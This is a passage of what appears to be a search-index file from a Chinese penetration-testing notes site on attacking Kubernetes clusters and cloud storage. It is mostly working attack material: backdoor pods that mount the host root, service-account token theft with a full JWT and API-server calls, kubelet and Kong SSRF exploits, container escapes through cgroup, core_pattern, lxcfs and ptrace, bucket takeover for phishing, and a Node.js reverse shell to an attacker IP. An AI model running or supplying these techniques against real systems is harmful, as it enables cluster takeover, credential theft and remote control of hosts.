test-volume volumes: - name: test-volume hostPath: path: / kubectl apply -f nginx-deploy.yaml kubectl get pods","title":"\u901a\u8fc7ReplicaSet/DaemonSet/Deplyment\u521b\u5efa\u5e76\u7ef4\u6301\u540e\u95e8\u5bb9\u5668"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#cronjob","text":"\u521b\u5efa\u4e00\u4e2aCronJob\u5b9a\u65f6\u6267\u884c\u4efb\u52a1\u7684\u5bb9\u5668 a.yaml apiVersion: batch/v1beta1 kind: CronJob metadata: name: echotest spec: schedule: \"*/1 * * * *\" jobTemplate: spec: template: spec: containers: - name: container image: nginx args: - /bin/sh - -c - echo test restartPolicy: OnFailure kubectl create -f cronjob.yaml \u9ed8\u8ba4namespaces\u662fdefault","title":"cronjob\u6301\u4e45\u5316"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#token","text":"","title":"\u5229\u7528token"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#rbac","text":"\u7248\u672c\u4f4e\u4e8e1.16\u7684k8s\u662f\u672a\u5f00\u542fRBAC\u7684\uff0c\u8fd9\u65f6\u5982\u679c\u62ff\u4e0b\u4e86\u5176\u4e2d\u4e00\u4e2apod\u53ef\u4ee5\u83b7\u53d6token\uff0c\u4ece\u800c\u83b7\u53d6\u6574\u4e2a\u96c6\u7fa4\u6743\u9650\u3002 \u8def\u5f84\u4e00\u822c\u4f4d\u4e8e /run/secrets/kubernetes.io/serviceaccount/token","title":"\u672a\u5f00\u542fRBAC\u7684\u60c5\u51b5"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_10","text":"\u627e\u5230token\u540e\u4e0b\u4e00\u6b65\u662f\u9700\u8981\u627e\u5230node\u7684ip\uff0c\u67e5\u770b\u5f53\u524d\u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u627e\u5230ip\u3002 \u67e5\u770btoken kubectl get secrets kubectl describe secrets default-token-ngptv \u5229\u7528Token\u4e0eAPI SERVER\u901a\u4fe1\uff0ccurl\u6216kubectl curl -ks -H \"Authorization: Bearer <TOKEN>\" https://master:6443/api/v1/namespaces/default/secrets kubectl --insecure-skip-tls-verify -s https://192.168.49.2:8443/ --token=\"eyJhbGciOiJSUzI1NiIsImtpZCI6ImdHUmNpR3dQZlJvQzdsbFJ4THJhVElwSkRNNms4MmFSakt5U2ZuQmppZTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc5MTExNzk0LCJpYXQiOjE2NDc1NzU3OTQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoia3ViZS1wcm94eS1zN2RoczEiLCJ1aWQiOiI2M2I4NTBjMy05ZGVlLTQ0NjctYmY2OS1mNDczYTQ1OTE3MWEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiI3Y2U4NDcwNi1hMzkwLTRlMTMtYjdjYy02ZDkwZGUxNjY0ZjIifSwid2FybmFmdGVyIjoxNjQ3NTc5NDAxfSwibmJmIjoxNjQ3NTc1Nzk0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVmYXVsdCJ9.La4cosGWedwVEF4QRibbvCtga0NiDNSJdpKqclAkVmoZI0zCz0dk295vRmrKaxMg_LLMO9gunqECdcKKRzGMF8kgelZC_DLrrePF2YdhIr2BCWtJQpdfZ62hx4nVydTHZZSr8zA-HMJOQY-5sfzXCbjrKHUyA4IvRNTE9oFZbTmwaa7xY9ZIOMfKhCh7laQBrKutUtZaRXGAuoRxaI4iVVFJc-oPKuQ_dzuKnZUIJMdcYR7mz8vuKt7hCal2H8nXjBO3Rakhy45tH6PBMULdrXjZswZuELKYfkYEgxgrVRM5YHXdIJFrb1ba1dkJM6ZmtfwUOnH_nT-dckJ1_pG7Iw\" -n kube-system get pods \u8bf7\u6c42\u5934\u4e2d\u7684TOKEN\u5fc5\u987b\u662fbase64\u683c\u5f0f Service Account \u53ef\u80fd\u7684Tokens\u9ed8\u8ba4\u4f4d\u7f6e /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt","title":"\u5229\u7528"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#6443","text":"https\u7684\uff0c\u9ed8\u8ba4\u662f\u9700\u8981\u6388\u6743\u7684\uff0c\u5982\u679c\u88ab\u9519\u8bef\u914d\u7f6e\u4e86\u533f\u540d\u7528\u6237\u6709\u7ba1\u7406\u6743\u9650\u7684\u8bdd\u53ef\u4ee5\u5229\u7528\u3002 \u5229\u7528\u65b9\u5f0f\u53c2\u80038080\u7aef\u53e3\u7684API\u64cd\u4f5c","title":"6443\u7aef\u53e3\u533f\u540d\u7528\u6237\u7279\u6743"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#kubelet-10250","text":"\u4e3b\u8981\u662f10250\u7aef\u53e3\u7684\u672a\u6388\u6743\u7684\u653b\u51fbkubelet https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/ kubelet\u672a\u6388\u6743RCE\u6f0f\u6d1e\u5229\u7528\u5de5\u5177https://github.com/serain/kubelet-anon-rce \uff0c\u6267\u884c\u547d\u4ee4\uff1a python3 kubelet-anon-rce.py --node 10.1.2.3 --namespace kube-system --pod tiller-797d1b1234-gb6qt --container tiller --exec \"whoami\" \u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c10250 API\u662f\u4e0d\u5141\u8bb8\u533f\u540d\u8bbf\u95ee\u7684 /pods curl -k /run/{namespace}/{podName}/{appName} -d \"cmd=whoami\"","title":"kubelet 10250\u672a\u6388\u6743"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#config","text":"Kubectl \u9ed8\u8ba4\u7684\u7ba1\u7406\u51ed\u636e\uff0ccat $HOME/.kube/config \u4f7f\u7528kubectl\u7ba1\u7406\u5176\u4ed6\u96c6\u7fa4\uff0c\u4f7f\u7528\u6307\u5b9a\u7684config\u6587\u4ef6\uff0c\u547d\u4ee4\uff1akubectl --kubeconfig kube-192.168.18.35.config get pods -n kube-system","title":"config\u7ba1\u7406\u51ed\u636e\u5229\u7528"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#node","text":"k8s\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u65b0\u7684pod\u4f1a\u88ab\u968f\u673a\u5206\u914d\u5230node\u3002\u53ef\u4ee5\u7ed9node\u8bbe\u7f6e\u6c61\u70b9\uff08Taints\uff09\u4ee5\u4fbf\u8ba9\u67d0node\u4e0d\u8fd0\u884cpod\uff0c\u8fd9\u91cc\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\u9632\u706b\u5899\u4e2d\u7684deny all\u3002\u540c\u65f6\uff0c\u53ef\u4ee5\u7ed9pod\u8bbe\u7f6e\u5bb9\u5fcd\uff08tolerations\uff09\u4ee5\u4fbf\u8ba9\u8be5pod\u53ef\u4ee5\u88ab\u8c03\u7528\uff0c\u76f8\u5f53\u4e8e\u5f00\u4e86\u4e00\u4e2aacl\u3002 \u5f53node\u8bbe\u7f6e\u4e86Taints\u540e\uff0c\u65b0\u7684pod\u5c06\u4e0d\u80fd\u8fd0\u884c\u5728\u4e00\u4e9bnode\u4e0a\uff0c\u8fd9\u6837\u5c31\u9650\u5236\u4e86\u6a2a\u5411\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7279\u6027\u6765\u6b63\u5e38\u8fdb\u884c\u6a2a\u5411\u3002 \u6c61\u70b9\uff08Taints\uff09\u7684\u4e09\u4e2a\u5c5e\u6027: NoSchedule \uff1a\u8868\u793a k8s \u5c06\u4e0d\u4f1a\u5c06 Pod \u8c03\u5ea6\u5230\u5177\u6709\u8be5\u6c61\u70b9\u7684 Node \u4e0a PreferNoSchedule \uff1a\u8868\u793a k8s \u5c06\u5c3d\u91cf\u907f\u514d\u5c06 Pod \u8c03\u5ea6\u5230\u5177\u6709\u8be5\u6c61\u70b9\u7684Node\u4e0a NoExecute \uff1a\u8868\u793a k8s \u5c06\u4e0d\u4f1a\u5c06 Pod \u8c03\u5ea6\u5230\u5177\u6709\u8be5\u6c61\u70b9\u7684 Node \u4e0a\uff0c\u540c\u65f6\u4f1a\u5c06 Node \u4e0a\u5df2\u7ecf\u5b58\u5728\u7684 Pod \u9a71\u9010\u51fa\u53bb \u53ef\u4ee5\u4f7f\u7528 kubectl describe node nodename \u6765\u67e5\u770bnode\u7684Taints\u5c5e\u6027\u548c\u503c \u2514\u2500# kubectl describe node minikube Name: minikube Roles: control-plane,master Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/arch=amd64 kubernetes.io/hostname=minikube kubernetes.io/os=linux minikube.k8s.io/commit=76b94fb3c4e8ac5062daf70d60cf03ddcc0a741b minikube.k8s.io/name=minikube minikube.k8s.io/updated_at=2022_03_17T02_25_37_0700 minikube.k8s.io/version=v1.24.0 node-role.kubernetes.io/control-plane= node-role.kubernetes.io/master= node.kubernetes.io/exclude-from-external-load-balancers= Annotations: kubeadm.alpha.kubernetes.io/cri-socket: /var/run/dockershim.sock node.alpha.kubernetes.io/ttl: 0 volumes.kubernetes.io/controller-managed-attach-detach: true CreationTimestamp: Thu, 17 Mar 2022 02:25:33 -0400 Taints: ab=ab:NoSchedule .................. Taints\u4e2d : \u5de6\u8fb9\u7684\u662fkey\u548c\u503c\uff0c\u53f3\u8fb9\u7684\u662feffect\u3002key\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u4e3a\u7a7a\u65f6\u4ee3\u8868\u53ef\u4ee5\u63a5\u6536\u6240\u6709\u7684key\u3002 \u7ed9pod\u914d\u7f6e\u6587\u4ef6\u8bbe\u7f6e\u4e00\u4e2atolerations\u503c\uff0c\u8fd9\u4e2a\u503c\u9700\u8981\u4e0enode\u7684Taints\u4e00\u6837\uff0c\u8868\u793a\u8fd9\u4e2apod\u53ef\u4ee5\u63a5\u53d7node\u7684\u6c61\u70b9\u3002 apiVersion: v1 kind: Pod metadata: name: myapp spec: tolerations: - key: ab operator: Exists effect: NoSchedule containers: - image: nginx name: test-container command: [\"/bin/sleep\", \"3650d\"] volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / \u5c1d\u8bd5\u591a\u6b21\u521b\u5efapod\uff0cpod\u88ab\u5206\u914d\u5230\u5176\u4ed6node\u4e0a\u65f6\u4fbf\u53ef\u4ee5\u6a2a\u5411\u4e86\u3002","title":"\u5229\u7528\u6c61\u70b9\u548c\u5bb9\u5fcd\u7279\u6027\u6765\u8fdb\u884cnode\u95f4\u6a2a\u5411"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#lxcfs","text":"\u67e5\u770b\u662f\u5426\u5b89\u88c5\u4e86\u670d\u52a1 cat /proc/1/mountinfo \u4fee\u6539lxcfs\u8bbf\u95ee\u6743\u9650 echo a > devices.allow \u83b7\u53d6\u4e3b\u8bbe\u5907\u53f7ID cat /proc/self/mountinfo | grep etc 3567 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/resolv.conf /mnt/etc/resolv.conf rw,relatime master:238 - ext4 /dev/sda1 rw,errors=remount-ro 3568 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/hostname /mnt/etc/hostname rw,relatime master:239 - ext4 /dev/sda1 rw,errors=remount-ro 3569 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/hosts /mnt/etc/hosts rw,relatime master:240 - ext4 /dev/sda1 rw,errors=remount-ro 3571 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/docker/containers/efd43944db8144aec6f7f05f07ca78a3462c9cc7d8dcd2c9aada0bf839f66518/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro 3572 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/docker/containers/efd43944db8144aec6f7f05f07ca78a3462c9cc7d8dcd2c9aada0bf839f66518/hostname /etc/hostname rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro 3573 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/kubelet/pods/63b850c3-9dee-4467-bf69-f473a459171a/etc-hosts /etc/hosts rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro mknod\u521b\u5efa\u6587\u4ef6\u76ee\u5f55 mknod mknod_near b 8 1 debugfs -w mknod_near ls \u76f4\u63a5cdk\u4e00\u952e\u6267\u884c ./cdk_linux_amd64 run lxcfs-rw","title":"\u5229\u7528lxcfs\u670d\u52a1\u8fdb\u884c\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#cgroup","text":"\u5f53\u5bb9\u5668\u914d\u7f6e\u4e86\u7279\u6743\u65f6\u4f7f\u7528\u3002 \u5c06cgroup\u6302\u8f7d\u5230\u5bb9\u5668 mkdir /tmp/dev mount -t cgroup -o devices devices /tmp/dev/ \u4fee\u6539\u5bb9\u5668\u7684cgroup\u8bbf\u95ee\u6743\u9650 echo a > /tmp/dev/docker/b76c0b53a9b8fb8478f680503164b37eb27c2805043fecabb450c48eaad10b57/devices.allow mknod \u521b\u5efa\u8bbe\u5907\u6587\u4ef6\u76ee\u5f55 mknod near b 252 1 debugfs -w near","title":"\u5229\u7528cgroup\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#proc","text":"\u67e5\u770b\u5bbf\u4e3b\u673a\u7684\u6587\u4ef6\u7ed3\u6784 \u5bb9\u5668\u5185\u6267\u884c sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab \u5bbf\u4e3b\u673a\u7684\u8def\u5f84\u662f\u65e0\u6cd5\u6253\u5f00\u7684\uff0c\u4e14\u91cd\u590d\u591a\u6b21\u7684 /var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff \u5728\u5bb9\u5668\u5185\u6839\u76ee\u5f55\u521b\u5efa\u6076\u610f\u6587\u4ef6\uff0c\u5bf9\u5e94\u5bbf\u4e3b\u673a\u7684 /var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff \u8def\u5f84 \u4fee\u6539\u5bb9\u5668\u5185core_pattern\u6587\u4ef6\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4fee\u6539\u4e86\u5bbf\u4e3b\u673aproc\u91cc\u7684\u6587\u4ef6 echo -e \"|/var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff/m.sh \\rcore \" > /proc/sys/kernel/core_pattern \u89e6\u53d1\u5bb9\u5668\u5185Segmentation fault\u4e4b\u540e\u4fbf\u6267\u884c\u4e86\u6076\u610f\u6587\u4ef6 \u2514\u2500# cat bengkui.c #include <stdio.h> int main(void) { int *a = NULL; *a = 1; return 0; } \u4f7f\u7528cdk\u76f4\u63a5\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u4ee5\u5728\u5bb9\u5668\u6839\u76ee\u5f55\u521b\u5efa\u4e00\u4e2a\u811a\u672c\uff0c\u7136\u540e\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002\u9700\u8981\u6ce8\u610f\u5bb9\u5668\u6839\u76ee\u5f55\u5728\u5bbf\u4e3b\u673a\u7684\u8def\u5f84\u3002 ./cdk run mount-procfs /proc \"bash /var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff/m.sh\" \u5728\u5f53\u524d\u6700\u65b0\u7248k8s\u96c6\u7fa4\u4e2d\uff0c\u5b89\u88c5\u540e\u9ed8\u8ba4\u6302\u8f7d\u4e86/proc\u3002\u53ef\u4ee5\u4ecemaster\u76f4\u63a5\u9003\u9038\u5230\u5bbf\u4e3b\u673a\uff0c\u540c\u7406\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5bb9\u5668\u9003\u9038\u5230node\u3002 kubectl version GitVersion:v1.23.1","title":"proc\u6302\u8f7d\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#sys_ptrace","text":"\u5f53\u8d4b\u4e88\u5bb9\u5668 cap_sys_ptrace \u6743\u9650\u65f6\uff0c\u5bb9\u5668\u53ef\u4ee5\u8fdb\u884c\u8fdb\u7a0b\u6ce8\u5165\u9003\u9038\u5230\u5bbf\u4e3b\u673a\u3002 \u68c0\u67e5\u6743\u9650 capsh --print cdk\u904d\u5386\u8fdb\u7a0b ./cdk run check-ptrace \u6ce8\u5165so\u6587\u4ef6 https://github.com/gaffe23/linux-inject ./inject -p 79230 fantan.so","title":"SYS_PTRACE\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#debugfs-","text":"https://fun0nydg.github.io/2021/06/19/The-role-of-debugfs-in-container-escape.html","title":"debugfs\u9003\u9038\u5229\u7528-\u6bd4\u8f83\u9ebb\u70e6\u8fd8\u672a\u6d4b\u8bd5\u8fc7"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2020-15257","text":"\u4f7f\u7528cdk\u7684shim-pwn","title":"CVE-2020-15257"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_11","text":"CVE-2016-5195\u6216CVE-2020-14386","title":"\u5185\u6838\u6f0f\u6d1e\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_12","text":"","title":"\u81ea\u52a8\u5316\u5229\u7528\u5de5\u5177"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#kube-hunter","text":"https://github.com/aquasecurity/kube-hunter","title":"kube-hunter"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#cdk","text":"https://github.com/cdk-team/CDK # \u4fe1\u606f\u6536\u96c6 cdk evaluate # \u5217\u4e3e\u5168\u90e8exp cdk run --list # \u6267\u884c\u6307\u5b9a\u7684exp cdk run <script-name> [options]","title":"cdk"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_13","text":"","title":"\u5176\u4ed6"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#serverless","text":"\u4e5f\u5c31\u662f\u4e91\u51fd\u6570\uff0c\u4e91\u51fd\u6570\u6709\u5b58\u6d3b\u65f6\u95f4\uff0c\u5982\u679c\u6709\u5e78\u6253\u5230\u4e86\u4e00\u53f0\u4e91\u51fd\u6570\u7684\u673a\u5668\u9700\u8981\u7acb\u523b\u67e5\u770benv\u627e\u5230AKSK\uff0c\u4e00\u822c\u9047\u4e0d\u5230\u3002","title":"Serverless\u6e17\u900f"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_14","text":"\u9664\u975e\u662f\u627e\u5230\u4e86SecretId\u3001SecretKey\uff0c\u6216\u8005\u6876\u9519\u8bef\u914d\u7f6e\u4e86\u6743\u9650\uff0c\u5426\u5219\u65e0\u6cd5\u5bf9\u4ed6\u4eba\u7684\u6876\u8fdb\u884c\u64cd\u4f5c\u3002 \u5f53\u6253\u5f00\u7f51\u7ad9\u53d1\u73b0\u8fd4\u56de\u4e86\u4e00\u4e2axml\u7ed3\u679c\uff0c\u6b64\u65f6\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u662f\u6876\u4ece\u800c\u8fdb\u884c\u8fdb\u4e00\u6b65\u653b\u51fb\u5c1d\u8bd5\uff0c\u81ea\u5efa\u57df\u540d\u4e0b\u4e5f\u53ef\u80fd\u662f\u6876\uff0c\u56e0\u4e3a\u53ef\u4ee5\u7ed1\u5b9acname\u3002","title":"\u5bf9\u8c61\u5b58\u50a8\u6e17\u900f"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#aws-s3","text":"","title":"AWS S3"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_15","text":"AWS\u7684\u4e2d\u5305\u542bBucketName\u5b57\u6837\u3002","title":"\u6307\u7eb9"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_16","text":"\u6839\u636e\u72b6\u6001\u7801\u5224\u65ad InvalidBucketName \u548c NoSuchBucket \u4ee3\u8868\u4e0d\u5b58\u5728 AccessDenied \u6216\u8005\u5217\u51fa\u4fe1\u606f\u4ee3\u8868\u5b58\u5728","title":"\u7206\u7834"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_17","text":"\u904d\u5386\u6587\u4ef6\u3001PUT\u4e0a\u4f20\u6587\u4ef6 \u5728\u6876\u5f03\u7528\u7684\u60c5\u51b5\u4e0b\u5c06\u6876\u52a0\u5230\u81ea\u5df1\u7684\u8d26\u53f7\u91cc\u9762\u8fdb\u884c\u63a5\u7ba1\uff0c\u5982\u679c\u6b64\u65f6\u8fd9\u4e2a\u6876\u8fd8\u7ed1\u5b9a\u4e86cname\u8bb0\u5f55\uff0c\u90a3\u4e48\u76f8\u5f53\u4e8e\u63a5\u7ba1\u76ee\u6807\u7684\u57df\u540d\u3002 \u4fee\u6539\u6876\u91cc\u7684\u8d44\u6e90\u6587\u4ef6\u4ee5\u4fbf\u9493\u9c7c \u8bfb\u53d6\u914d\u7f6e\u4ee5\u4fbf\u8fdb\u884c\u8bbf\u95ee\u654f\u611f\u6587\u4ef6 \u4fee\u6539\u6876\u7684ACL \u4fee\u6539\u5bf9\u8c61\u7684ACL \u53c2\u8003\uff1ahttps://mp.weixin.qq.com/s/aqTnyNgTSBan_FpqfFRb7Q","title":"\u5229\u7528"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#oss","text":"\u548cAWS S3\u4e00\u6837 \u683c\u5f0f\u662f xxxx.oss-cn-beijing.aliyuncs.com \u6839\u636eOSS\u5730\u533a\u4e0d\u540c\uff0c\u53ef\u80fd\u9700\u8981\u53d8\u66f4\u57ce\u5e02\u540d\u79f0 \u5229\u7528\u70b9\u548cAWS\u5dee\u4e0d\u591a\uff0c\u547d\u4ee4\u8bed\u6cd5\u7565\u6709\u533a\u522b \u5b98\u65b9\u6587\u6863 \u63a7\u5236\u53f0\u64cd\u4f5c\u6307\u5357 - \u5bf9\u8c61\u5b58\u50a8 OSS - \u963f\u91cc\u4e91 \u83b7\u53d6OSS\u914d\u7f6e ossutil bucket-policy oss://xxxxx --method get \u4fee\u6539\u914d\u7f6e ossutil bucket-policy oss://xxxxx --method put xx.json","title":"\u963f\u91cc\u4e91OSS"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#obs","text":"\u90fd\u5dee\u4e0d\u591a\u7684\uff0c\u683c\u5f0f\u662f xxxx.obs.cn-south-1.myhuaweicloud.com \u3002\u53ef\u4ee5\u76f4\u63a5\u53bb\u81ea\u5df1\u7684\u63a7\u5236\u53f0\u6dfb\u52a0\u6876\uff0c\u52a0\u4e0d\u5230\u8bf4\u660e\u5df2\u5b58\u5728\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fdb\u4e00\u6b65\u5229\u7528\u3002 \u9047\u5230\u65f6\u518d\u8bfb\u5b98\u65b9\u6587\u6863 \u521d\u59cb\u5316\u914d\u7f6e_\u5bf9\u8c61\u5b58\u50a8\u670d\u52a1 OBS_obsutil_\u5feb\u901f\u5165\u95e8_\u534e\u4e3a\u4e91","title":"\u534e\u4e3a\u4e91OBS"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#cos","text":"\u817e\u8baf\u4e91\u76f8\u8f83\u5b89\u5168\u4e00\u70b9\uff0c\u56e0\u4e3a\u817e\u8baf\u4e91\u7684\u6876\u5728\u751f\u6210\u65f6\u4f1a\u5728\u8bbf\u95ee\u5730\u5740\u4e2d\u751f\u6210\u4e00\u4e2a\u65f6\u95f4\u6233\uff0c\u53ef\u4ee5\u907f\u514d\u6876\u7206\u7834\u548c\u521b\u5efa\u76f8\u540c\u6876\u540d\u63a5\u7ba1\u57df\u540d\u7684\u95ee\u9898\u3002 \u9047\u5230\u65f6\u518d\u8bfb\u5b98\u65b9\u6587\u6863 \u5bf9\u8c61\u5b58\u50a8 COSCLI \u7b80\u4ecb - \u5de5\u5177\u6307\u5357 - \u6587\u6863\u4e2d\u5fc3 - \u817e\u8baf\u4e91","title":"\u817e\u8baf\u4e91COS"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#blob","text":"\u683c\u5f0f\u662f\u4ee5\u8d26\u53f7\u547d\u4ee4\uff0c xxxx.blob.core.windows.net \u4f7f\u7528 https://xxxx.blob.core.windows.net/xxxx?restype=container&comp=list \u5217\u51fa\u5bf9\u8c61 Blob\uff08\u5bf9\u8c61\uff09\u5b58\u50a8\u7b80\u4ecb - Azure Storage | Microsoft Docs","title":"\u5fae\u8f6f\u4e91Blob"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#gcs","text":"\u683c\u5f0f\u662f\u4ee5\u8d26\u53f7\u4e3a\u8def\u5f84 https://storage.googleapis.com/xxxx https://cloud.google.com/storage/#section-4","title":"\u8c37\u6b4c\u4e91GCS"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_18","text":"\u601d\u8def\u90fd\u4e00\u6837\uff0c\u9047\u5230\u4e86\u518d\u53bb\u7ffb\u6587\u6863\u5c31\u662f\u4e86\u3002","title":"\u5176\u4ed6\u4e91\u5e73\u53f0"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#aws-lambdashell","text":"(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"\u6b64\u5904\u66ff\u6362\u4e3a\u653b\u51fb\u7aefIP\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();","title":"AWS Lambda\u53cd\u5f39shell"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_19","text":"kube-apiserver: 6443, 8080 kubectl proxy: 8080, 8081 kubelet: 10250, 10255, 4149 dashboard: 30000 docker api: 2375 etcd: 2379, 2380 kube-controller-manager: 10252 kube-proxy: 10256, 31442 kube-scheduler: 10251 weave: 6781, 6782, 6783 kubeflow-dashboard: 8080","title":"\u654f\u611f\u7684\u7aef\u53e3"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#kong-api","text":"\u6307\u7eb9 \u670d\u52a1\u7aef\u8fd4\u56de Server: kong/x.x.x","title":"Kong API\u7f51\u5173\u5f00\u6e90\u7248"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#cve-2020-11710","text":"\u5229\u7528\u7248\u672c\u5c0f\u4e8e2.0.3\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165Kong API\u7f51\u5173\u5185\u7f51 usage: kong-pwn.py [-h] -u URL -s SSRF [-p PROXY] kong-pwn.py: error: the following arguments are required: -u/--url, -s/--ssrf $ python3 kong-pwn.py -u http://127.0.0.1:8001 [+] Service Added [+] [+] Route Added [+] [+] Testing Kong for Metadata Proxy curl http://127.0.0.1/foo/ -H \"Host: metadata.local\" -H \"Metadata: true\" -H \"Metadata-Flavor: Google\" 1.0 2007-01-19 2007-03-01 2007-08-29 2007-10-10 2007-12-15 2008-02-01 2008-09-01 2009-04-04 2011-01-01 2011-05-01 2012-01-12 2014-02-25 2014-11-05 2015-10-20 2016-04-19 2016-06-30 2016-09-02 2018-03-28 2018-08-17 2018-09-24 2019-10-01 latest [+] To remove added routes and services do the following curl -iX DELETE http://127.0.0.1:8001/routes/metadata-endpoint curl -iX DELETE http://127.0.0.1:8001/services/metadata-endpoint #!/usr/bin/env python # # Kong SSRF # # # By 